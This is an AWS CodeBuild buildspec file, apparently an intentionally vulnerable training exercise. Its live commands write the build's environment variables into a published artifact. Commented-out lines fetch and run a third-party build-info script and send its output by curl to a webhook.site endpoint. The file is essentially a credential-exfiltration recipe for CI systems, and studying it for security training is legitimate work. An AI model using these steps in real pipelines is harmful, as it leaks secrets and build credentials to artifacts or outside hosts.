version: 0.2

phases:
  build:
    commands:
      - echo "Running vulnerable training build"
      - env | sort | head -n 20 >> notes.txt
      - echo "Done"
      - python -m pip install botocore boto3 requests >> notes.txt
      #- wget https://raw.githubusercontent.com/thomaspreece/AWS-CodeFactoryTokenService-API/refs/heads/main/GetBuildInfo.py
      #- python ./GetBuildInfo.py > out.txt
      #- curl --data-binary @out.txt https://webhook.site/4c6c201b-a23e-4f07-8820-71f3f6e8e7bf
artifacts:
  files:
    - "notes.txt"
